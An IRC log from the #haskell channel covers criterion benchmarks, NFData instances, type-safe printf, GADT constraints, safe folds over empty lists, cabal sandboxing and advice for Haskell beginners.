10:22:35 <joelteon> ooh, a generator generator for quickcheck
10:23:12 <mcstar> `C { unC :: Int } :: Type Float` vs. `C :: {unC :: Int} -> Type Float`
10:24:41 <mcstar> it is a little weird to see that unC can give you an int, even if C constructs Type Float
10:24:52 <mcstar> (but i guess thats the point of GADTs :))
10:28:03 <ReinH> edwardk: yo
10:28:24 <ReinH> edwardk: let me know if you find those alphabeta and negascout snippets lying around :)
10:28:32 <ReinH> a/b is pretty easy but I'd love to see your version
10:29:01 <ReinH> I figured I'd just turn minimax into negamax and then prune that
10:34:03 <edwardk> heh, i've mentioned that i had them to others, and not found them, so don't hold your breath ;)
10:34:17 <identity> http://www.reddit.com/r/haskell/comments/1lboh4/announcing_ghc_ios/ woot!
10:34:30 <ReinH> edwardk: argh :p
10:34:44 <ReinH> well write another one and then show me that
10:35:13 <joelteon> how was the sample criterion report created?
10:35:18 <joelteon> it's quite pretty and I would like to make one like it
10:39:30 <dmwit> joelteon: http://stackoverflow.com/q/9741167/791604
10:40:20 <joelteon> oh, rights
10:41:06 <dmwit> (found by ddg'ing "using criterion to generate graphs haskell")
10:41:26 <joelteon> ok, i'll try to google more thoroughly next time
10:43:45 <mcstar> i need a bionic implant, a haskell type co-processor...
10:44:14 <identity> i think half the people in here already have something like that
10:45:08 <joelteon> hmm
10:45:18 <joelteon> my first benchmark, which basically does nothing, is significantly slower than the next three
10:45:49 <dmwit> Perhaps your next three do an even faster nothing.
10:45:51 <identity> moral of the story: Doing nothing gets you nowhere in life!
10:46:31 <joelteon> Yeah, I suppose that could be it
10:47:07 <joelteon> but they do successively run slower, which is what I'd expect
10:47:41 * hackagebot kif-parser 0.0.3 - Process KIF iOS test logs  http://hackage.haskell.org/package/kif-parser-0.0.3 (JanChristiansen)
10:47:52 <dmwit> Without seeing the code, I'm going to blame laziness.
10:49:05 <joelteon> I'll post the code once I can figure out how to get the benchmark report on the interwebs somewhere
10:50:21 <joelteon> here's the code https://gist.github.com/joelteon/47c2178a1a6957bbf75b
10:50:29 <joelteon> and the report http://i.joelt.io/report.html
10:51:01 <mcstar> im trying to write a typed formatter, using a GADT, so far, failure, i dont really know how/what i want :(
10:51:19 <joelteon> and the code itself is here https://github.com/joelteon/damnpacket
10:52:26 <dmwit> joelteon: You have an empty NFData instance?
10:52:30 <dmwit> What are you expecting that to do?
10:52:34 <dmwit> (hint: nothing)
10:52:43 <joelteon> Oh, heh, maybe that's it.
10:52:50 <joelteon> :|
10:53:03 <donri> dmwit: it's fine for some types
10:53:07 <dmwit> Well, to be completely honest, I would expect it to do an exception. But perhaps criterion is made to deal with that kind of thing.
10:53:19 <dmwit> donri: For example?
10:54:02 <donri> dmwit: any type with no unevaluated fields
10:54:20 <joelteon> ok, well, I wrote a proper instance for it (I think) but I'm getting the same result
10:54:34 <dmwit> donri: That's not a sensible sentence. Types don't have fields that can be evaluated or unevaluated; only terms do.
10:54:53 <donri> dmwit: i'm just citing the deepseq docs more or less verbatim
10:55:09 <donri> http://hackage.haskell.org/packages/archive/deepseq/1.3.0.1/doc/html/Control-DeepSeq.html#v:rnf
10:55:13 <joelteon> well I'm going to check whether rnf is actually rnf'ing or not
10:56:01 <dmwit> That documentation should be fixed. But I understand the claim now.
10:56:17 <dmwit> And joelteon's type was not of this form. =)
10:57:21 <joelteon> yeah, it looks like the instance I just wrote makes sense
10:57:31 <joelteon> just folds seq over the rnf of Packet's fields
10:58:11 <joelteon> also the fact that the first example is "severely" inflated by outliers
10:58:28 <joelteon> might it be related to evaluating the sample Texts?
10:59:47 <joelteon> no, that doesn't make sense
11:00:51 <mcstar> i wonder if this 'printf problem' is made up or not
11:02:21 <mcstar> why cant there be something like `printf [String "int is ", Int 4, String ", float is ", Float 16 pi, String ", and a last string"]`
11:02:33 <Krakarn> anyone else here who have studied the "Programming with Arrows" paper?
11:02:56 <valyagolev> I did recently, with sad results
11:02:59 <dmwit> mcstar: Nothing prevents it except programmer annoyance.
11:03:25 <monochrom> mcstar: there can be, and probably someone did it, but I didn't track it
11:03:28 <mcstar> dmwit: but is it really annoying? we just need proper (short, intuitive) format specifiers for each type
11:03:56 <Krakarn> valyagolev: did you get to the part where he talked about stream processing?
11:03:58 <bennofs> mcstar: I often use mconcat $ intercalate " " $ ["aa", show someVar, "asad"]
11:04:10 <bennofs> (or intercalate "\n")
11:04:18 <bennofs> @ty intercalate
11:04:19 <lambdabot> [a] -> [[a]] -> [a]
11:04:23 <valyagolev> Krakarn the example or the exercise?
11:04:30 <bennofs> oh, the mconcat is not neccessary then ...
11:04:41 <mcstar> show is not enough, though, since you want to format stuff, like how many digits you need of a float and such
11:04:42 <Krakarn> valyagolev: the exercise
11:05:10 <jfischoff> intercalate "\n" == unlines
11:05:35 <Krakarn> valyagolev: like the "data SP a b = Put b (SP a b) | Get (a -> SP a b)
11:06:40 <mcstar> i just read danvy's paper on functional unparsing, but i didnt really like it
11:06:48 <valyagolev> Krakarn yep, this is where I failed
11:07:11 <donri> mcstar: xformat?
11:07:16 <valyagolev> Krakarn I found some code on the internet, adaption to the modern state of haskell, but it didn't work either
11:07:23 <mcstar> donri: idk, whats the trick there?
11:07:26 <Krakarn> valyagolev: well, me too, I guess. I checked some answers after trying to come up with something on my own
11:08:15 <valyagolev> Krakarn there's infinite recursion in mapA, for example, which I can't understand how to get rid of.
11:08:24 <Krakarn> valyagolev: the overall feeling I get is that some information is missing about how to logically think about these problems
11:08:54 <valyagolev> Krakarn I tried asking here but with no success, maybe I'll try stack overflow later, when I return to this:)
11:09:39 <mcstar> i cant even decide what would be better, building up a format specification from some tokens, that represent types and formatting, and this specification at the end would take the arguments of the proper types, or just build the string up, as you compose the specifiers, each applied on the input values
11:09:46 <Krakarn> I don't think there is infinte recursion in mapA since you are checking for an empty list
11:10:05 <valyagolev> Krakarn the recursion is when you're building your arrow
11:10:08 <mcstar> the latter is the easiest to implement
11:10:40 <valyagolev> it never actually builds it, try :print / :force / pattern match the mapA of something
11:11:02 <mcstar> but the former could have the advantage of some kind of partial evaluation, that would optimize a certain format string for fast formatting
11:11:05 <valyagolev> because to build mapA it wants to know what the first constructor of mapA is,
11:12:05 <Krakarn> I don't think I'm following you
11:13:03 <valyagolev> Krakarn `mapA (arr smth)` is not a function (if the arrow is ST), it is a datatype. Like list or whatever. You can try calculating what it equals to
11:13:39 <mcstar> or, with TH couldnt we just write `[fmt| %d is int, %f is float and %s is string  |] x y z` ?
11:13:50 <valyagolev> Krakarn I did it by hand and found the infinite recursion
11:14:50 <mcstar> with `...` :: Int -> Float -> String -> String
11:15:08 <mcstar> well, without the arguments x y z obviously
11:15:42 <Krakarn> valyagolev I don't understand. Surely mapA is a function
11:16:08 <donri> mcstar: there's a number of TH based printf packages on hackage
11:16:20 <Krakarn> it takes an arrow and makes it operate on a list of values
11:16:20 <valyagolev> Krakarn I'm talking about `mapA` of some arrow, not mapA itself
11:16:22 <Krakarn> just like map
11:16:46 <valyagolev> Krakarn it takes an arrow and returns another arrow
11:17:05 <mcstar> donri: does ghc come with 'built-in' printf functionality?
11:17:08 <Krakarn> yes, it returns an arrow that operates on a list of values
11:17:11 <valyagolev> Krakarn and this another arrow can't be calculated, because it depends on itself
11:17:16 <Krakarn> an returns a list of valuies
11:17:25 <mcstar> is Data.Text.printf part of the ghc distribution or not
11:18:15 <Rarrikins> mcstar: It's part of the base package.
11:18:20 <mcstar> syr, no Data.
11:18:35 <Rarrikins> mcstar: http://hackage.haskell.org/packages/archive/base/4.2.0.1/doc/html/Text-Printf.html
11:18:47 <mcstar> yeam, im there, already :)
11:19:03 <mcstar> but, is it planned to upgrade ghc to come with a type-safe one?
11:19:26 <Rarrikins> mcstar: That is a type-safe one.
11:19:29 <Krakarn> valyagolev: but what about the case where it just returns an empty list?
11:19:42 <mcstar> "Mismatch between the argument types and the format string will cause an exception to be thrown at runtime. "
11:19:47 <mcstar> it isnt
11:19:56 <Rarrikins> mcstar: Oh, I see what you mean.
11:20:04 <Rarrikins> mcstar: No, you'll need template haskell for that.
11:20:06 <valyagolev> Krakarn: do this: write down the definition of mapA. substitute all the values you know. try to calculate it
11:20:47 <valyagolev> Krakarn: just like you would do with (1 + 3 + 9): you add 1 and 3, you get (4 + 9). then you get 11. try doing it with all these (>>>)
11:20:50 <Eduard_Munteanu> What's a good pretty printing lib to use with Text these days?
11:22:38 <donri> Eduard_Munteanu: wl-pprint-text
11:22:39 <mcstar> Rarrikins: i just dont understand why not use the research on type safe formatting... is every solution to it too 'uncomfortable'?
11:22:57 <Eduard_Munteanu> Thanks, will have a look.
11:24:33 <Krakarn> valyagolev: I see what you're getting at
11:24:35 <Krakarn> however
11:25:02 <Krakarn> I think that because of lazy evaluation, it works when you try to apply it some value
11:25:37 <valyagolev> Krakarn try applying it to some value, then. Is it terminating for you?
11:27:03 <Krakarn> well
11:27:22 <Krakarn> If I'm evaluating the function arrow
11:27:47 <Krakarn> it seems to work just like a normal recursive function
11:28:00 <valyagolev> what about ST?
11:28:08 <valyagolev> SP
11:28:48 <monochrom> hrm, interesting, let me code up SP's Arrow instance etc and try
11:29:30 <valyagolev> monochrom here is the paper we're talking about http://ipaper.googlecode.com/git/Arrow/arrows-afp.pdf
11:30:00 <valyagolev> very unfortunately I'll have to go, I'll take a look at the logs in the morning to see if you guys come up with something
11:35:17 <absence> is there a guard-like function for Alternative anywhere? something in the neighbourhood of Alternative f => Bool -> f a -> f a
11:36:44 <Clint> you mean the opposite of (<|>) ?
11:38:46 <absence> Clint: not quite sure, there's no Bool involved in <|>
11:38:55 <bscarlet> @hoogle Alternative f => Bool -> f a -> f a
11:38:55 <lambdabot> Control.Applicative (<|>) :: Alternative f => f a -> f a -> f a
11:38:55 <lambdabot> Control.Monad unless :: Monad m => Bool -> m () -> m ()
11:38:55 <lambdabot> Control.Monad when :: Monad m => Bool -> m () -> m ()
11:40:07 <Eduard_Munteanu> foo = [
11:40:17 <Eduard_Munteanu> ] -- any reason why this isn't supported?
11:41:08 <absence> guess i want "whenA p s = if p then s else empty", just wanted to make sure i wasn't re-"inventing" the wheel
11:41:45 <Eduard_Munteanu> I've been using C-stylish data declarations lately and I noticed this "discrepancy".
11:42:14 <pentace> Eduard_Munteanu: ] has to be indented
11:42:14 <Eduard_Munteanu> data Foo = Foo {...\n} works fine though.
11:42:16 <mcstar> splitting a list to multiple lines?
11:42:19 <mcstar> that works
11:42:31 <Eduard_Munteanu> pentace: I know, I wonder why though
11:42:43 <Eduard_Munteanu> mcstar: sure, but not like that :)
11:43:36 <Eduard_Munteanu> ]-under-,-under-[ style works, but I was wondering.
11:44:34 <Eduard_Munteanu> Strangely it doesn't like braces either, I could swear that worked.
11:45:16 <mcstar> data Rec = Rec {\n} works
11:45:26 <Eduard_Munteanu> Yeah, I know.
11:45:29 <mcstar> right, you mentioned that :)
11:45:46 <mcstar> so what does not work with braces then?
11:46:03 <Eduard_Munteanu> mcstar: foo = { ...
11:46:20 <pentace> braces are special when it comes to layout
11:46:32 <mcstar> Eduard_Munteanu: how would you make that a whole expression?
11:46:48 <Eduard_Munteanu> > let foo = { 5 } in foo
11:46:49 <lambdabot>   <hint>:1:11: parse error on input `{'
11:47:07 <pentace> foo = Just {\n} works
11:47:22 <Eduard_Munteanu> pentace: but that's record syntax
11:47:31 <pentace> yes
11:48:17 <enthropy> Eduard_Munteanu: use braces like   module M where {
11:48:38 <pentace> Eduard_Munteanu: I can see no other way to use braces in expressions, though
11:48:39 <enthropy> then you don't get an implied } in the middle of your empty list
11:49:25 <Eduard_Munteanu> > let foo = let { } in { 5 } in foo
11:49:26 <lambdabot>   <hint>:1:22: parse error on input `{'
11:49:41 <Eduard_Munteanu> enthropy: not sure what you mean
11:49:45 <arkeet> > let {} in 5
11:49:46 <lambdabot>   5
11:50:17 <lpaste> enthropy pasted “Eduard_Munteanu” at http://lpaste.net/92289
11:50:17 <simon> it seems that 'type Point = Real a => (a, a)' requires some non-default extensions. is this generally sane?
11:50:25 <Eduard_Munteanu> > let foo = let { def = 5 } in def in foo
11:50:27 <lambdabot>   5
11:50:51 <arkeet> > let foo = let def = 5 in def in foo
11:50:52 <lambdabot>   5
11:51:08 <Eduard_Munteanu> simon: you get a polymorphic a, only constrained by Real
11:51:23 <enthropy> hmm, or maybe it's an implied semicolon
11:51:29 <arkeet> simon: are you sure you really want that type?
11:51:36 <Eduard_Munteanu> simon: so if you use that in a type like Point -> Point -> ... those would probably not be what you want
11:52:05 <Eduard_Munteanu> enthropy: oh, fun.
11:52:14 <simon> Eduard_Munteanu, because I'd restrict it to be the same type with typeclass Real?
11:52:30 <arkeet> simon: no, because skolem.
11:52:48 <arkeet> what you wrote is  type Point = forall a. Real a => (a, a)
11:52:52 <enthropy> @src GenericQ
11:52:52 <lambdabot> Source not found.
11:52:52 <simon> arkeet, maybe I want 'type Point = Real a, b => (a, b)
11:52:55 <arkeet> you don't.
11:53:04 <arkeet> Point -> Point -> ... is like
11:53:08 <arkeet> (forall a. Real a => (a, a)) -> (forall a. Real a => (a, a)) -> ...
11:53:08 <Eduard_Munteanu> simon: that translates to (forall a. Real a => (a, a)) -> (forall a. Real a => (a, a)) -> ...
11:53:21 <arkeet> nothing in there lets you assume that those two 'a's are the same
11:53:32 <arkeet> so you can't really do anything with them.
11:53:36 <arkeet> you probably want something more like
11:53:39 <arkeet> type Point a = (a,a)
11:53:52 <arkeet> or use a specific a, like Point = (Double,Double)
11:54:13 <simon> hmm, so keep typeclasses to function signatures?
11:54:15 <Eduard_Munteanu> Or ConstraintKinds perhaps.
11:54:23 <arkeet> then you can write stuff like Real a => Point a -> Point a -> ...
11:54:52 <Eduard_Munteanu> (not worth it in this case though)
11:55:14 <arkeet> might be worth making your own data type though.  data Point a = Point a a
11:55:18 <mcstar> type Real a => Point a = (a, a) would make sense though, wouldnt it?
11:55:36 <arkeet> maybe.
11:56:04 <arkeet> nope, syntax error.
11:56:07 <mcstar> i know
11:56:18 <mcstar> i meant, semantically
11:56:34 <Eduard_Munteanu> Even constraints on data declarations are rather meaningless.
11:56:49 <arkeet> type Point a = Real a => (a,a)
11:56:54 <mcstar> the question is like, could i write a Maybe functor, that would only accept types of a certain typeclass?
11:56:57 <arkeet> is accepted, with some extensions.
11:57:08 <Eduard_Munteanu> arkeet: that's still rank-2
11:57:12 <arkeet> that's one of the extensions.
11:57:28 <arkeet> anyway, don't do it.
11:57:56 <arkeet> but otherwise it seems to work alright.
11:58:01 <Eduard_Munteanu> mcstar: what would its kind be?
11:58:10 <mcstar> * -> *
11:58:14 <Eduard_Munteanu> Might be possible with ConstraintKinds but unsure.
11:58:18 <mcstar> with restriction? :)
11:58:21 <Eduard_Munteanu> mcstar: then is it a partial functor? :)
11:58:58 <arkeet> data Maybe' a where Just :: C a => a -> Maybe' a; ...
11:58:58 <arkeet> ?
11:59:26 <mcstar> if you think about it, function arguments can have typeclass constraints, why cant calue constructors have too?
11:59:31 <arkeet> then deconstructing one would bring a C instance into scope.
11:59:32 <mcstar> value*
11:59:51 <arkeet> does this not work?
11:59:55 <arkeet> fsvo work
11:59:58 <mcstar> idk, let me check
12:00:08 <arkeet> hm, forgot to rename Just too. :p
12:00:17 <Eduard_Munteanu> arkeet: you can still talk about "bad" Maybe' applications
12:00:37 <Eduard_Munteanu> I think.
12:01:14 <Eduard_Munteanu> IOW, I don't think there's a way for the compiler to know you can't construct values for that GADT ahead of time.
12:01:51 <Eduard_Munteanu> Well, if it even matters.
12:02:39 <Eduard_Munteanu> (if you expect to automagically lift that constraint to Maybe' 's context.)
12:02:54 <mcstar> data Num a => Maybe' a = Just' a | Nothing' works with DatatypeContexts
12:03:23 <Eduard_Munteanu> mcstar: I think DatatypeContext doesn't quite do what you want, IIRC
12:03:42 <mcstar> '-XDatatypeContexts is deprecated: It was widely considered a misfeature, and has been removed from the Haskell language.'
12:03:49 <Eduard_Munteanu> In fact it's a H2010 thing to re-enable the old H98 behavior.
12:04:34 <mcstar> Eduard_Munteanu: it seems to work, Just' 3 is ok, Just' "" is not
12:04:51 <lpaste> arkeet pasted “??” at http://lpaste.net/92290
12:04:59 <arkeet> I don't know what's going on.
12:05:09 <arkeet> oh duh.
12:05:10 <arkeet> I know.
12:05:26 <arkeet> just needed to pattern match on a constructor.
12:05:30 <arkeet> how annoying.
12:05:49 <arkeet> because pattern matching brings the instance into scope.
12:06:10 <arkeet> no need for STV either.
12:06:32 <Eduard_Munteanu> arkeet: does it pass coverage checking without a catch-all case, though?
12:06:46 <arkeet> -Wall doesn't complain.
12:06:59 <Eduard_Munteanu> Hm.
12:07:12 <arkeet> I just added cases for f N _ and f _ N
12:07:29 <arkeet> and it should be clear that that's all of them
12:07:34 <Eduard_Munteanu> arkeet: oh, that does..
12:08:06 <Eduard_Munteanu> arkeet: but my guess was it isn't enough to match only the presumed inhabited cases.
12:08:29 <arkeet> ??
12:09:10 <lpaste> arkeet annotated “??” with “?? (annotation)” at http://lpaste.net/92290#a92291
12:09:16 <Eduard_Munteanu> arkeet: f (J ()) (J ()) = ...  would be accepted, right?
12:09:45 <Eduard_Munteanu> Actually forget that.
12:09:59 <arkeet> Couldn't match expected type `a' with actual type `()'
12:10:01 <Eduard_Munteanu> If you pattern-match on () it can tell it's not a Num.
12:10:02 <arkeet> ;)
12:10:17 <arkeet> rigid type variable etc.
12:10:46 <Eduard_Munteanu> I guess it's not problematic at all then.
12:11:01 <arkeet> it's probably the only way to do data type contexts right.
12:11:05 <arkeet> and then not really.
12:11:47 <Eduard_Munteanu> arkeet: still I don't think you can do anything like  instance Num a => Num (M a)
12:11:56 <mcstar> No context is allowed on a GADT-style data declaration
12:11:58 <arkeet> why not find out?
12:12:03 <mcstar> (You can put a context on each contructor, though.)
12:12:07 <arkeet> mcstar: that's what we're doing.
12:12:12 <mcstar> ghc is very helpful sometimes :)
12:12:22 <Eduard_Munteanu> Because you can't get the Num => "lifted out" of the GADT.
12:13:07 <mcstar> (i was quoting ghc, if it wasnt clear)
12:13:18 <jack_rabbit> I'm sort of new to haskell. I have a reduce function of type (a -> a -> a) -> [a] -> a, but I'm not sure what to return in the case [a] is the empty list.
12:13:21 <Eduard_Munteanu> Errr... that probably works, unless you want to omit the 'Num a' constraint.
12:13:31 <jack_rabbit> I'm not sure what the idiomatic "null" is.
12:13:42 <arkeet> no, you need the Num a constraint to write fromInteger.
12:13:44 <arkeet> and then everything works.
12:14:04 <mcstar> i wonder why doesnt the Num a reflect on f's type
12:14:14 <arkeet> jack_rabbit: there is none.
12:14:26 <arkeet> jack_rabbit: that's why foldr1 errors when you give it the empty list.
12:14:28 <arkeet> :t foldr1
12:14:28 <lambdabot> (a -> a -> a) -> [a] -> a
12:14:51 <arkeet> :t foldr1 const []
12:14:52 <lambdabot> a
12:15:01 <arkeet> there is no value of type a for every a.
12:15:04 <arkeet> other than an error.
12:15:14 <mcstar> thats not a nice value
12:15:25 <jack_rabbit> arkeet, I see. That makes sense.
12:15:50 <jack_rabbit> arkeet, I've not learned exceptions yet, so I guess I'll continue reading.
12:15:58 <mcstar> hm, it cant reflect, since 'M a' doesnt contain the Num a constraint
12:16:27 <mcstar> and since J cant take anything but Num a , it will always work
12:16:28 <mcstar> nice
12:16:48 <arkeet> jack_rabbit: usually, the proper way to do it is to provide a starting value.
12:16:51 <arkeet> then you get something like foldr.
12:16:52 <arkeet> :t foldr
12:16:53 <lambdabot> (a -> b -> b) -> b -> [a] -> b
12:18:13 <mcstar> > let reduce f _ = 0 in reduce (+) [1..]
12:18:14 <lambdabot>   0
12:18:18 <mcstar> that was fast
12:18:35 <simon> arkeet, it seems that GADTs do what I was aiming at, thanks for making me investigate those. :)
12:19:25 <mcstar> i think i wrote a cache-oblivous reduce function
12:19:29 <jack_rabbit> arkeet, Sure. I guess I'm just used to lisp's variadic functions. :)
12:20:28 <leifw> mcstar: oh?
12:20:48 <leifw> oh hi
12:20:51 <leifw> ha
12:21:07 <mcstar> you got it, great :)
12:21:33 <arkeet> :t \f l -> foldr (\a Nothing -> Just a; a j = fmap (f a) j) Nothing
12:21:34 <lambdabot> parse error on input `;'
12:21:50 <arkeet> :t \f l -> foldr (\a -> maybe (Just a) (fmap (f a))) Nothing
12:21:51 <lambdabot> (Maybe a -> a -> Maybe a) -> t -> [Maybe a] -> Maybe (Maybe a)
12:21:53 <arkeet> oops.
12:22:28 <mcstar> now try singing that type as if it were a lullaby
12:23:34 <arkeet> :t \f l -> foldr (\a -> maybe (Just a) (Just . f a)) Nothing
12:23:35 <lambdabot> (a -> a -> a) -> t -> [a] -> Maybe a
12:23:48 <arkeet> :t \f -> foldr (\a -> maybe (Just a) (Just . f a)) Nothing
12:23:49 <lambdabot> (a -> a -> a) -> [a] -> Maybe a
12:24:18 <FreeFull> > (\f -> foldr (\a -> maybe (Just a) (Just . f a)) Nothing) (+) [1,2,3]
12:24:19 <lambdabot>   Just 6
12:24:21 <FreeFull> > (\f -> foldr (\a -> maybe (Just a) (Just . f a)) Nothing) (+) []
12:24:23 <lambdabot>   Nothing
12:24:50 <mcstar> > (\f -> foldr (\a -> maybe (Just a) (Just . f a)) Nothing) (+) [1]
12:24:51 <lambdabot>   Just 1
12:25:11 <FreeFull> arkeet: There probably is a better way to write this
12:25:24 <arkeet> hopefully
12:25:45 <arkeet> I can't think of anything though.
12:26:07 <mcstar> > let msum xs = if sum xs == 0 then Nothing else Just sum xs in msum [1..10]
12:26:09 <lambdabot>   Couldn't match expected type `[a0] -> Data.Maybe.Maybe a1'
12:26:09 <lambdabot>              wit...
12:26:09 <FreeFull> You could use pattern matching
12:26:20 <arkeet> and then what?
12:26:27 <mcstar> > let msum xs = if sum xs == 0 then Nothing else Just (sum xs( in msum [1..10]
12:26:28 <lambdabot>   <hint>:1:62: parse error on input `in'
12:26:29 <mcstar> > let msum xs = if sum xs == 0 then Nothing else Just (sum xs) in msum [1..10]
12:26:30 <lambdabot>   Just 55
12:26:33 <mcstar> > let msum xs = if sum xs == 0 then Nothing else Just (sum xs) in msum []
12:26:34 <lambdabot>   Nothing
12:26:46 <arkeet> > let msum xs = if sum xs == 0 then Nothing else Just (sum xs) in msum [1,-1]
12:26:47 <lambdabot>   Nothing
12:26:48 <FreeFull> > let safeFoldr1 _ [] = Nothing; safeFoldr1 f xs = Just $ foldr1 f xs
12:26:49 <lambdabot>   not an expression: `let safeFoldr1 _ [] = Nothing; safeFoldr1 f xs = Just $...
12:26:55 <mcstar> :)
12:26:57 <arkeet> FreeFull: the whole point is to avoid foldr1.
12:27:05 <mcstar> arkeet: its a 'quick hack' XD
12:27:06 <FreeFull> > let safeFoldr1 _ [] = Nothing; safeFoldr1 f xs = Just $ foldr1 f xs in safeFoldr1 (+) [1,2,3]
12:27:07 <lambdabot>   Just 6
12:27:13 <FreeFull> > let safeFoldr1 _ [] = Nothing; safeFoldr1 f xs = Just $ foldr1 f xs in safeFoldr1 (+) []
12:27:14 <lambdabot>   Nothing
12:28:47 <arkeet> plus, it's good to write things as folds.
12:42:44 * hackagebot penny 0.26.0.0 - Extensible double-entry accounting system  http://hackage.haskell.org/package/penny-0.26.0.0 (OmariNorman)
12:47:44 * hackagebot mongodb-queue 0.2.5.1 - a message queue using MongoDB  http://hackage.haskell.org/package/mongodb-queue-0.2.5.1 (GregWeber)
12:52:03 <mcstar> im reading Double-entry bookkeeping system but so far i dont see why 'each transaction was entered twice' is a good thing
12:53:40 <mcstar> does this mean, that if i spend X$ on something, my credit will decrease by X$ and my debit will increase by X$?
12:53:48 <mcstar> why is this necessary?
12:54:09 <scshunt> no
12:54:38 <scshunt> this is totally offtopic here though
12:55:15 <mcstar> not really, penny is written in haskell
12:55:41 <mcstar> scshunt: but im on haskell-blah if you want to enlighten me
12:56:43 <sm> so refreshing to see some discussion of haskell tools here
12:56:52 <sm> mcstar: but #ledger might be another good place
12:57:08 <mcstar> im not interested in finance THAT much :)
12:57:20 <sm> fair enough
12:57:44 * hackagebot mongodb-queue 0.2.5.2 - a message queue using MongoDB  http://hackage.haskell.org/package/mongodb-queue-0.2.5.2 (GregWeber)
12:57:51 <sm> just know that the people there obsess about questions like this
12:58:07 <fl00r> it depends on whose perspective it's from...
12:58:40 <fl00r> for the bank, if a customer deposits money, liabilities go up on one side, but so does cash
13:00:15 <monochrom> software construction benefits from a multiple-entry system. e.g., specification is entered in at least 3 forms: in natural language, in formal specification language, and in programming language (also formal)
13:00:22 <Rembane> mcstar: If you spend $X on something, the amount of money on your account will decrease, and the amount of money locked into sweet stuff will increase.
13:01:46 <fl00r> as for why...i guess because accountants like the equation equity = assets - liabilities
13:02:11 <Ralith> Rembane: but that implies mcstar only spends money on sweet stuff!
13:02:32 <mcstar> >> blah
13:02:57 <fl00r> or because it gives a bunch of people stuff to do
13:03:20 <Rembane> Ralith: ^^
13:16:57 <Taneb> Would cabal install --libdir=/dev/null/ do remotely what I expect it too?
13:19:04 <lispy> ls: /dev/null/: Not a directory
13:19:15 <lispy> Taneb: so, I'm going to say....no
13:19:25 <Taneb> Yay answer
13:19:53 <Taneb> Can anyone suggest something that would do what I want? (that is, install but not really)
13:20:41 <lispy> Taneb: --dry-run?
13:21:04 <lispy> it's listed by `cabal install --help` but I don't know how well it exercises the install command
13:21:11 <sm> fl00r: traditionally (with paper ledgers) double entry provided both error checking and an audit trail, allowing you to trace any falsification of books
13:21:30 <lispy> Taneb: alternatively, you could use cabal-dev (or cabal HEAD on github) and install into a sandbox
13:21:39 <fl00r> sm: yeah...i was just being glib
13:21:53 <Taneb> Yeah, cabal-dev is probably a much easier option
13:22:04 <Taneb> I think --dry-run just lists what will actually get installed
13:22:16 <Taneb> ie, dependencies and the package itself
13:22:43 <monochrom> --dry-run goes as far as figuring out the install plan
13:22:44 <pentace> Taneb: What do you mean by "install but not really"?
13:23:15 <Taneb> pentace, build it, but don't register it or any library that it has to install in the process of building it with GHC
13:23:40 <pentace> cabal build?
13:23:48 <monochrom> but if you want to go through all the building registering etc and then just throw it all away, see my http://www.vex.net/~trebla/haskell/cabal-cabal.xhtml#sandbox
13:24:12 <pentace> (that will install the dependencies, though)
13:24:21 <monochrom> and yeah there is also cabal build. but you need cabal configure first
13:24:47 <monochrom> well, that will install the dependencies but you will throw it all away too
13:24:55 <mcstar> sm: can you explain the falsification claim on -blah?
13:25:47 <monochrom> oops, my url is wrong
13:25:47 <sm> I'm not on -blah, sorry
13:26:05 <monochrom> it should be http://www.vex.net/~trebla/haskell/sicp.xhtml#sandbox
13:26:38 <mcstar> sm: /join haskell-blah ?
13:27:04 <mcstar> i dont want to force you ofc, just wondering why cant you..
13:27:32 <sm> I'm watching 12 channels, and I get enough blah on #haskell already ? :)
13:32:07 <emiliano1> hello
13:32:23 <Taneb> Hi, emiliano1
13:32:46 <emiliano1> so, I had a couple of questions
13:33:06 <emiliano1> I am relatively new to Haskell
13:33:29 <emiliano1> but I think I have a pretty good grasp of the IO monad
13:33:56 <emiliano1> and I now want to do something useful with Haskell
13:34:10 <emiliano1> but I don't actually have a background in software developing
13:34:41 <edwardk> emiliano1: what are you looking to do?
13:34:44 <emiliano1> and I think this is a problem that a lot of beginners face
13:34:56 <emiliano1> I am not really sure
13:35:15 <emiliano1> so far I have been doing Project Euler problems
13:35:18 <cschneid> emiliano1: it is. I have gotten myself through it by setting a goal. I already know web stuff, so I am working on a simple blog website. (ie, create/edit posts, display, search, etc.).
13:35:28 <cschneid> even though it's simple, it's a real problem that involves lots of the outside world
13:35:30 <joneshf-work> i think that's more of a problem people have than not having a background in something
13:35:56 <emiliano1> well I have had a couple of ideas so far
13:36:08 <emiliano1> but I face difficulties that I am really unsure how to resolve
13:36:28 <cschneid> emiliano1: cool, pick one and dive into it for sure. I'm still learning, but the guys around here are amazing.
13:36:56 <emiliano1> okay
13:37:11 <edwardk> emiliano1: i learn by ostensibly starting to solve some problem that is outside of my grasp by looking around for the pieces of it i can understand and starting to build those
13:37:42 <emiliano1> well, I tried to do some gui stuff to begin with
13:37:53 <emiliano1> with gtk2hs
13:38:14 <edwardk> emiliano1: e.g. 20 years ago i decided i was going to write a game engine, 15 years ago i decided i was going to write a programming language, etc. i rarely get where i'm headed, but i get a lot of neat toys along the way ;)
13:38:32 <emiliano1> hmm okay
13:38:47 <emiliano1> what do you mean by a game engine, by the way?
13:39:18 <Rarrikins> emiliano1: It's a thing that handles all the actions and items in a game.
13:39:55 <emiliano1> okay, so how is that different than making the game?
13:40:00 <edwardk> well, that would be back around the release of wolfenstein 3d, so at the time i had some cute rendering tricks for drawing heightmap "voxel" worlds and moving characters through caves and stuff, so after wolfenstein i added walls
13:40:16 <emiliano1> oh cool
13:40:17 <emiliano1> okay
13:40:22 <mcstar> but that wasnt in haskell
13:40:24 <edwardk> emiliano1: nowadays to 'write a game' you usually just grab an 'engine' off the shelf. install unity, write some scripts and publish it
13:40:29 <mcstar> edwardk met haskell in 2006
13:40:36 <mcstar> im i right?
13:40:39 <mcstar> am
13:40:40 <edwardk> emiliano1: back then you had to start from scratch
13:40:49 <emiliano1> I see
13:40:59 <edwardk> mcstar: sure. but as he's starting from scratch as a developer, i figured i'd give general purpose advice
13:41:34 <edwardk> emiliano1: anyways i continued in that vein until i evolved past my initial vision and turned to bigger goals.
13:41:46 <emiliano1> okay
13:41:52 <emiliano1> another question I had was
13:42:06 <sm> emiliano1: a game engine/framework/library is a reusable chunk of code that tends to be the same in many different games
13:42:18 <emiliano1> ah
13:42:19 <emiliano1> okay
13:42:31 <emiliano1> also, how useful do you guys find things like arrows?
13:42:54 <emiliano1> is arrow a useful enough abstraction?
13:43:03 <sm> not useful when you're starting out, don't worry about it
13:43:04 <Jeanne-Kamikaze> it is pretty sexy, yes
13:43:09 <edwardk> arrows were an early attempt to capture 'something weaker than a monad'. its place is largely taken now by 'applicative' instead
